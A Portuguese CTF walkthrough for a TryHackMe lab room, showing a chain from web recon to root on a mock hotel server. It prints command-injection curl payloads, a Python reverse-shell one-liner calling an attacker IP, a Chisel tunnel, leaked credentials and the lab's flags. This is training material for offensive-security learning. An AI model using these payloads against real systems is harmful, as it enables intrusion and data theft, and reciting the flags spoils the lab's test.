# TryHackMe — Hackers Holiday CTF
## Level 1 — Infinity Pool

**Categoria:** Web / Command Injection / Internal Service Enumeration / Privilege Escalation via API  
**Dificuldade:** Difícil 

---

### 🛎️ Concierge Briefing

> Byte Lotus Hotel promises a seamless stay powered by modern technology. Sometimes the most interesting systems are the ones guests were never meant to see.

---

## 🎯 Objetivo

O briefing é propositalmente vago, mas a pista está no contraste: um hotel que promete uma "estadia integrada por tecnologia moderna" — e a observação de que os sistemas mais interessantes são os que os hóspedes **não deveriam ver**. O objetivo é mapear a superfície de ataque da infraestrutura web do Byte Lotus, descobrir endpoints internos expostos indevidamente, explorar uma vulnerabilidade de **injeção de comando** em uma ferramenta de staff, escalar privilégios através de serviços internos mal configurados e capturar as flags de usuário e root.

---

## 🔍 Passo 1 — Reconhecimento: Nmap + Gobuster

O primeiro passo foi mapear a superfície de ataque com um scan de portas e enumeração de diretórios:

```bash
sudo nmap -A -sC -Pn -p- -T4 10.67.161.184

gobuster dir \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x js,json,txt,log \
  -t 30 \
  -u http://10.67.161.184/
```

![Nmap e Gobuster revelando portas abertas e diretórios](/Hacker%20Holiday%202026%20-%20THM/11º%20Level%20-%20Infinity%20Pool/images/Nmap_Gobuster_Scan.png)

Resultados relevantes do Nmap:
- **Porta 22/tcp** — OpenSSH 9.6p1 (Ubuntu Linux)
- **Porta 80/tcp** — HTTP (Gunicorn) — título: *"Byte Lotus — Stay Noticed"*
- `robots.txt` com **2 entradas proibidas** (`/internal/` e `/status`)
- Gobuster encontrou: `robots.txt` e `/status` (status 200)

O servidor web usa **Gunicorn**, indicando uma aplicação Python por trás.

---

## 🔍 Passo 2 — robots.txt e o Mapa do Proibido

Acessando `http://10.67.161.184/static/robots.txt`:

![robots.txt revelando os caminhos /internal/ e /status](/Hacker%20Holiday%202026%20-%20THM/11º%20Level%20-%20Infinity%20Pool/images/robots.txt.png)

```
User-agent: *
Disallow: /internal/
Disallow: /status
```

O `robots.txt` é a primeira contradição do sistema: ao tentar esconder `/internal/` e `/status` dos indexadores, o arquivo serve de **mapa para atacantes**. Dois caminhos para investigar.

---

## 🔍 Passo 3 — Código-fonte do Frontend: app.js

Inspecionando o arquivo JavaScript do frontend em `http://10.67.161.184/static/app.js`:

![app.js com comentário de desenvolvedor expondo o endpoint interno](/Hacker%20Holiday%202026%20-%20THM/11º%20Level%20-%20Infinity%20Pool/images/app.js.png)

```javascript
// Byte Lotus front-end bootstrap.
// TODO(ops): the staff connectivity tool at /status posts to the legacy
// /internal/netcheck handler. Keep it out of the public nav until the new
// auth gateway ships. Disallowed in robots.txt for now.
console.log("Stay Noticed™");
```

O comentário de desenvolvedor entrega o mecanismo interno: `/status` envia requisições POST para **`/internal/netcheck`**, um handler legado de verificação de conectividade de rede. A nota de TODO confirma que o endpoint ainda não tem gateway de autenticação — está simplesmente "escondido" no `robots.txt`.

---

## 🔍 Passo 4 — A Ferramenta de Staff: /status

Acessando `http://10.67.161.184/status` diretamente no navegador:

![Página /status com o formulário de conectividade](/Hacker%20Holiday%202026%20-%20THM/11º%20Level%20-%20Infinity%20Pool/images/status.png)

A página exibe uma ferramenta marcada como **"STAFF TOOLS"** — *"Sister-property connectivity"*:

> *"Confirm a remote property responds before routing a guest transfer."*

O formulário aceita um endereço IP de host e executa uma verificação de conectividade (ping). Embora marcada como interna, a página está acessível sem qualquer autenticação.

---

## 🔍 Passo 5 — Testando Injeção de Comando no /internal/netcheck

Com `curl`, foi possível interagir diretamente com o endpoint backend sem passar pela interface web:

```bash
# Teste com IP externo (sem resposta esperada)
curl -i -X POST 'http://10.67.161.184/internal/netcheck' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'host=10.0.0.5'

# Teste com loopback (confirma execução real)
curl -i -X POST 'http://10.67.161.184/internal/netcheck' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'host=127.0.0.1'
```

![Testes iniciais com curl confirmando que o input é passado ao ping](/Hacker%20Holiday%202026%20-%20THM/11º%20Level%20-%20Infinity%20Pool/images/Test_Curl.png)

Os testes revelaram que o valor do campo `host` é passado **diretamente** para um comando `ping` no sistema operacional, sem sanitização:

![Tabela de testes provando ausência de validação no parâmetro host](/Hacker%20Holiday%202026%20-%20THM/11º%20Level%20-%20Infinity%20Pool/images/Teste_Resolution_GPT.png)

| Entrada | Resultado | Conclusão |
|---|---|---|
| `10.0.0.5` | ping executado | Input chega ao sistema |
| `127.0.0.1` | responde | Servidor executa o ping de verdade |
| `localhost` | resolve para 127.0.0.1 | DNS funciona |
| `banana` | Name or service not known | Sem validação rígida de IP |
| `10.0.0.999` | Name or service not known | Valor é passado diretamente ao `ping` |

O próximo passo foi testar separação de comandos com **ponto-e-vírgula**:

```bash
curl -s -X POST 'http://10.67.161.184/internal/netcheck' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'host=127.0.0.1;python3 --version'
```

![Command injection confirmada: Python 3.12.3 e /usr/bin/bash retornados](/Hacker%20Holiday%202026%20-%20THM/11º%20Level%20-%20Infinity%20Pool/images/Check_if_Have_Python.png)

A resposta incluiu `Python 3.12.3` na saída — **injeção de comando confirmada**. Adicionalmente:

```bash
--data 'host=127.0.0.1;which bash'
# Resposta: /usr/bin/bash
```

O servidor tem Python 3 e Bash disponíveis — ingredientes suficientes para uma reverse shell.

---

## 🚩 Passo 6 — Flag de Usuário via Command Injection

Com a injeção de comando confirmada, foi direto ao alvo:

```bash
# Listando o home do usuário web
curl -s -X POST 'http://10.67.161.184/internal/netcheck' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'host=127.0.0.1;ls /home/web'
# Resultado: user.txt

# Lendo a flag
curl -s -X POST 'http://10.67.161.184/internal/netcheck' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'host=127.0.0.1;cat /home/web/user.txt'
```

![Leitura do user.txt via command injection revelando a flag de usuário](/Hacker%20Holiday%202026%20-%20THM/11º%20Level%20-%20Infinity%20Pool/images/Command_Injection_User.txt.png)

A saída da requisição, embutida no HTML de resposta, revelou:

```
THM{n0_v1s1bl3_3dg3}
```

---

## 🔍 Passo 7 — Reverse Shell e Enumeração dos Serviços Internos

Para explorar os serviços internos com mais profundidade, foi estabelecida uma **reverse shell** via Python através da injeção:

```bash
# No atacante: ouvindo na porta 4444
nc -lnvp 4444

# Via curl: injetando o one-liner Python
curl -s -X POST 'http://10.67.161.184/internal/netcheck' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'host=127.0.0.1;python3 -c "import socket,os,pty;s=socket.socket();s.connect((\"192.168.157.47\",4444));[os.dup2(s.fileno(),i) for i in (0,1,2)];pty.spawn(\"/usr/bin/bash\")"'
```

Com shell interativa como `web@tryhackme-2404`, a enumeração dos serviços com `ss -lntup` e `ps auxww` revelou os processos e portas internas:

![ss -lntup e ps auxww revelando serviços internos](/Hacker%20Holiday%202026%20-%20THM/11º%20Level%20-%20Infinity%20Pool/images/Services_Blockeds.png)

Serviços internos identificados (apenas acessíveis via loopback):

| Porta | Serviço |
|-------|---------|
| 80 | Aplicação web pública (Gunicorn) |
| 3000 | API interna — "watchtower" |
| 8080 | Portal de telefonia — FreePBX UCP |
| 9000 | Endpoint de automação |
| 1186 | active feeds |

---

## 🔍 Passo 8 — Enumeração da API Interna: Watchtower (porta 3000)

Com acesso à shell, foi possível interagir diretamente com os serviços internos:

```bash
# Health check da API
curl -s http://127.0.0.1:3000/api/health
# {"bind":"127.0.0.1:3000","service":"watchtower","status":"ok"}

# Configuração completa
curl -s http://127.0.0.1:3000/api/config | python3 -m json.tool
```

![API interna retornando configurações e credenciais em texto claro](/Hacker%20Holiday%202026%20-%20THM/11º%20Level%20-%20Infinity%20Pool/images/Enum_Privesc_API.png)

O endpoint `/api/config` retornou um objeto JSON com informações críticas:

```json
{
  "automation_endpoint": "http://127.0.0.1:9000",
  "note": "internal network only -- do not expose",
  "ops_note": "UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
  "telephony_pass": "St4yN0t1c3d_2026",
  "telephony_portal": "http://127.0.0.1:8080/ucp",
  "telephony_user": "FreePBXUCPTemplateCreator"
}
```

A API interna vazou, em texto claro, as **credenciais do portal FreePBX UCP** e o endpoint do serviço de automação. A nota de ops é particularmente reveladora: o administrador sabia que as credenciais padrão deveriam ser rotacionadas — e nunca fez isso.

---

## 🔍 Passo 9 — CVE-2026-46376: FreePBX Hard-Coded Credentials

Uma pesquisa rápida sobre o usuário `FreePBXUCPTemplateCreator` levou ao **CVE-2026-46376**, publicado no GitHub:

![CVE-2026-46376 — FreePBX UCP via credenciais hard-coded](/Hacker%20Holiday%202026%20-%20THM/11º%20Level%20-%20Infinity%20Pool/images/CVE.png)

**CVE-2026-46376 — FreePBX Unauthenticated UCP Access via Hard-Coded Credentials**  
CVSS v4.0: **9.1 (Critical)** | CWE-798: Use of Hard-Coded Credentials

Quando um administrador utiliza o recurso de setup de template genérico do UCP (introduzido em 2021), um usuário `FreePBXUCPTemplateCreator` é criado com uma senha estática gerada pela classe `Userman.class.php` via MD5. Se o administrador nunca alterar essa senha após o setup, qualquer atacante na rede pode acessar o UCP com essas credenciais.

No ambiente do Byte Lotus, a situação era ainda mais crítica: além do CVE existir, o `/api/config` havia **vazado explicitamente a senha em uso** (`St4yN0t1c3d_2026`), removendo qualquer necessidade de brute force.

---

## 🔍 Passo 10 — Acesso ao FreePBX UCP via Chisel Tunnel

O portal FreePBX UCP (porta 8080) só estava acessível via loopback. Para abri-lo no navegador do atacante, foi configurado um **túnel reverso com Chisel**:

**No atacante (servidor):**
```bash
./chisel server -p 9999 --reverse
```

**No servidor comprometido (cliente), via shell:**
```bash
./chisel client 192.168.157.47:9999 R:8080:127.0.0.1:8080
```

![Chisel server ouvindo e sessão de túnel estabelecida](/Hacker%20Holiday%202026%20-%20THM/11º%20Level%20-%20Infinity%20Pool/images/chisel.png)

Com o túnel ativo (`proxy#R:8080=>8080: Listening`), acessando `http://127.0.0.1:8080/ucp` no navegador do atacante e autenticando com:

- **Usuário:** `FreePBXUCPTemplateCreator`
- **Senha:** `St4yN0t1c3d_2026`

![Login bem-sucedido no FreePBX UCP com as credenciais vazadas](/Hacker%20Holiday%202026%20-%20THM/11º%20Level%20-%20Infinity%20Pool/images/Enter_in_Session.png)

Acesso ao painel do FreePBX UCP estabelecido com sucesso.

---

## 🔍 Passo 11 — Chave de Automação no Voicemail

Dentro do FreePBX UCP, a caixa de entrada **INBOX** continha **1 mensagem de voz não lida**:

![Voicemail com a automation key no campo CID](/Hacker%20Holiday%202026%20-%20THM/11º%20Level%20-%20Infinity%20Pool/images/Auttomation_Key.png)

| Campo | Valor |
|-------|-------|
| **Data** | Tue, Jun 30, 2026 — 9:31 AM |
| **CID (Caller ID)** | `"Automation Key" cc_auto_7b3f9a1c4e0d2f6a <9000>` |
| **Duração** | 3 segundos |

O campo CID da chamada continha a **chave Bearer** para o serviço de automação interno na porta 9000: `cc_auto_7b3f9a1c4e0d2f6a`. A chamada partiu da extensão `<9000>` — exatamente a porta do `automation_endpoint` revelado pelo `/api/config`.

---

## 🔍 Passo 12 — Exploração da API de Automação: Root via Command Injection

Com a chave Bearer em mãos, o próximo passo foi interagir com o endpoint de automação `/jobs/export`. O campo `report` do payload JSON apresentava uma **segunda injeção de comando**, desta vez executando como **root**:

```bash
curl -X POST http://127.0.0.1:9000/jobs/export \
  -H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" \
  -H "Content-Type: application/json" \
  -d '{"command": "tar", "report": "; cat /root/root.txt #"}'
```

![Root flag obtida via command injection na API de automação](/Hacker%20Holiday%202026%20-%20THM/11º%20Level%20-%20Infinity%20Pool/images/Root_Flag.png)

O serviço de automação rodava com privilégios de **root**. A injeção no campo `report` (que é concatenado em um comando `tar` sem sanitização) permitiu a leitura direta do arquivo da flag:

```json
{
  "command": "tar czf /var/automation/exports/; cat /root/root.txt #.tgz /var/automation/data 2>&1",
  "output": "THM{tr4c3d_t0_th3_h0r1z0n}\ntar: Cowardly refusing to create an empty archive\n..."
}
```

---

## 🚩 Flags

| Flag | Valor |
|------|-------|
| **User Flag** | `THM{n0_v1s1bl3_3dg3}` |
| **Root Flag** | `THM{tr4c3d_t0_th3_h0r1z0n}` |

---

## 📝 Resumo da cadeia de investigação

1. **Nmap + Gobuster** → portas 22 e 80 abertas; `robots.txt` com entradas `/internal/` e `/status`
2. **robots.txt** → serve de mapa: revela os caminhos ocultos
3. **app.js** → comentário de desenvolvedor expõe que `/status` faz POST para `/internal/netcheck`
4. **/status** → ferramenta de staff (ping de propriedades parceiras) acessível sem autenticação
5. **Command Injection** → separador `;` no campo `host` permite execução arbitrária de comandos
6. **User Flag** → `cat /home/web/user.txt` → `THM{n0_v1s1bl3_3dg3}`
7. **Reverse Shell** → Python one-liner via injeção, obtendo shell como `web@tryhackme-2404`
8. **Enumeração interna** → `ss -lntup` revela portas 3000, 8080 e 9000 apenas no loopback
9. **/api/config (porta 3000)** → API "watchtower" vaza credenciais FreePBX e endpoint de automação em texto claro
10. **CVE-2026-46376** → usuário de template FreePBX com credenciais nunca rotacionadas
11. **Chisel tunnel** → túnel reverso expõe a porta 8080 para o navegador do atacante
12. **FreePBX UCP** → login com credenciais vazadas; voicemail revela Bearer token `cc_auto_7b3f9a1c4e0d2f6a`
13. **API de automação (porta 9000)** → segunda command injection como root → `THM{tr4c3d_t0_th3_h0r1z0n}`

---